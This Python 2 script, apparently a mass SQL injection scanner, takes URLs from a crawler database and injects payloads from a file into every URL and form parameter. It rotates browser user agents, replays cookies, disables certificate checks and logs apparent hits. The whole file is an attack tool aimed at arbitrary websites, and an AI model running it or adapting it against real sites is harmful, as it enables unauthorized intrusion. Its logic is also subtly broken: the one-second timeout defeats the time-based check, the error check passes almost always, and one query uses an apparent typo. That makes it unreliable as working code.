#!/usr/bin/python
# -*- coding: UTF-8 -*-

import mechanize
import requests
import random
import sqlite3
import sys
from urlparse import urlparse 
from urlparse import parse_qs
from urlparse import urlunsplit
import timeit
import argparse
import os

user_agents = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36", \
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2", \
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", \
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)"
                ]

def dictToQuery(d):
    query = ""
    for key in d.keys():
        query += str(key) + "=" + str(d[key]) + "&"
    return query[:-1]

# make parameters from html form
def make_parameters(url):
    
    br = mechanize.Browser()
    
    if cookie is None:
        br.addheaders = [('User-agent', random.choice(user_agents))]
        
    else:
        br.addheaders = [('User-agent', random.choice(user_agents)),\
                         ("Cookie", cookie)]
    
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    
    try:
        br.open(url)
        
    except Exception as e:
#         print url
#         print e 
        return False
    
    method = ""
    action = ""
    result = []
     
    try:
        forms = [f for f in br.forms()]
        
    except Exception as e: 
        return False
    
    if forms == []:
        return False
    
    for form in forms:
        try:
            method = form.method
        except:
            method = "GET"
        
        try:
            action = form.action
            
        except Exception as e: 
            print e
        
        payloads = {}
        method = form.method
        action = form.action
        
        value_number = len(form.controls)
    
        for value in range(value_number):
            try:
                name = str(form.controls[value].name)
            except:
                name = ""
            try:
                value = str(form.controls[value].value)
            except:
                value = ""        
            
            payloads[name] = value
        result.append([payloads, method, action])
        
    return result

def save_data(method, case, url, payloads, res):
    
    #time based check
    if res.elapsed.seconds > 13 and res.elapsed.seconds < 17:
        f = open("sqli_time_based.csv", "a+")
            
        if payloads:
            f.write(urlparse(url)[1] + "," + method + "," + case + ","  + payloads + "," + "time based" + "\n")
            f.close()
            print url
                
        else:
            f.write(urlparse(url)[1] + "," + method + "," + case + "," + url + "," + "time based" + "\n")
            f.close()
            print url
    
    #error based check
    res_contents = res.content
    if res_contents.find("error"):
        f = open("sql_injection_result.csv", "a+")
            
        if payloads:
            f.write(urlparse(url)[1] + "," + method + "," + case + ","  + payloads + "," + "error based" + "\n")
            f.close()
            print url
                
        else:
            f.write(urlparse(url)[1] + "," + method + "," + case + "," + url + "," + "error based" + "\n")
            f.close()
            print url
        
        
def web_request(payloads, method, action, case, attack_commands):
    
    url_scheme = urlparse(action)[0] 
    url_location = urlparse(action)[1] 
        
    action = urlunsplit((url_scheme, url_location, "", "", ""))
    
    if method == "GET" and case == "case1":
        
        try:
            
            if cookie is None:
                
                try:
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       verify = False,\
                                       params = payloads)
                                                            
                    save_data(method, case, str(res.url), None, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass
            else:
                
                try:
                    res = requests.get(action, timeout = 1,\
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    save_data(method, case, str(res.url), None, res)
   
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass                         
                            
        except Exception as e: 
            print action
            print e
        
    elif method == "GET" and case == "case2":
        try:
            
            if cookie is None:
                
                try:
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       params = payloads,\
                                       verify = False)
                  
                    save_data(method, case, str(res.url), None, res)
                 
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass
                
            else:
                
                try:
                    
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    
                    save_data(method, case, str(res.url), None, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass
                             
        except Exception as e: 
            print action
            print e
    
    elif method == "POST" and case == "case2":
                
        try:
            if cookie is None:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       data = payloads,\
                                       verify = False)
                                        
                    save_data(method, case, str(res.url), payloads, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass
                
            else:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       data = payloads)
                                        
                    save_data(method, case, str(res.url), payloads, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    cur.close()
                    end_time = timeit.default_timer() 
                
                    print "*" * 120
                    print "you send requests %s times" % (req_cnt - f_req_cnt)
                    print '\nsql injection attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
                    
                    sys.exit(0) 
                    
                except Exception as e:
                    print e
                    pass
                
                else:
                    pass
                               
        except Exception as e: 
            print action
            print e
    
       
def sql_injection_attack(payloads, method, action, case, attack_commands):
    
    global req_cnt
    tmp_value = ""
    
    for name in payloads.keys():
        tmp_value = payloads[name]
        for attack_command in attack_commands:
            
            payloads[name] += attack_command
            
            web_request(payloads, method, action, case, attack_commands)
    
            req_cnt += 1
            
            payloads[name] = tmp_value
            
            print "%s requesting" %(req_cnt)
           
def main():
    
    usage        = '''./sql_injection_time_based.py -t google'''
    
    parser = argparse.ArgumentParser(description = "sql injection injection for pen testing", \
                                     usage = usage)
    parser.add_argument("-t", "--table", required=True, help="sqlite table name to attack")
    parser.add_argument("-c", "--cookie", required=False, help="filename containing cookie")
    parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.0 (04/24/2014)')
    
    args = parser.parse_args()

    filename = "sql_time_attack"
    
    global attack_commands
    attack_commands = open(filename).read()
    attack_commands = attack_commands.split("\n")

    global table_name 
    table_name = args.table
    
    global cookie
    cookie_filename = args.cookie
    
    try:
        f = open(cookie_filename).read()
        cookie = str(f).strip()
        
    except:
        cookie = None
        
    try:
        os.remove("sqli_time_based.csv")
    except:
        pass
    
    
    global req_cnt
    req_cnt = 0
    
    global start_time
    start_time = timeit.default_timer()
     
    global conn
    conn = sqlite3.connect("crawler.db")
    conn.text_factory = str
    
    global cur
    cur = conn.cursor()

    links_to_visit_params = []
    
#step1
    cur.execute("select url from " + table_name + " where res_code = '200'")
  
    for row in cur:
        
        url = row[0]
        # there are payloads in url
        if urlparse(url)[4]:
            payloads = parse_qs(urlparse(url).query)
              
            # method
            # from {u'action': [u'M01']} to {u'action': u'M01'}
            for name in payloads.keys():
                payloads[name] = payloads[name][0]
                        
            url_with_params = str(urlparse(url)[2]) + str(sorted(payloads.keys())) 
            
            # to reduce duplicate urls
            if url_with_params not in links_to_visit_params:
                  
                # case1: there are parameters in url, not action
                sql_injection_attack(payloads, "GET", url, "case1", attack_commands)
                links_to_visit_params.append(url_with_params)
                
    end_time = timeit.default_timer() 
    
    global f_req_cnt
    f_req_cnt = req_cnt
    
    print "*" * 120
    print "you send requests %s times" % f_req_cnt
    print '\nsql injection attack\'s stage 1 is done: ', end_time - start_time
    print "*" * 120
    
#setp2 
    cur.execute("select url from " + table_name + " where res_code = '2000'")
    
    # form test
    for row in cur:
         
        url = row[0]
      
        results = make_parameters(url)
  
#         if there is no form, it return False 
        if results:
            for result in results:
                
                # none attr is submit
                payloads = result[0]
                method = result[1]
                action = result[2]
                
                if method == "GET":
                    
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys())) 
                    
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                        
                        sql_injection_attack(payloads, method, action, "case2", attack_commands)
              
                        links_to_visit_params.append(url_with_params)
                        
                        
                elif method == "POST":
                    
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys()))
                    
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                        
                        sql_injection_attack(payloads, method, action, "case2", attack_commands)
              
                        links_to_visit_params.append(url_with_params)                    
                            
    cur.close()
    end_time = timeit.default_timer()
    print "*" * 120
    print "you send requests %s times" % (req_cnt - f_req_cnt)
    print '\nsql injection attack\'s stage 2 is done: ', end_time - start_time
    print "*" * 120
    
if __name__ == "__main__":
    main()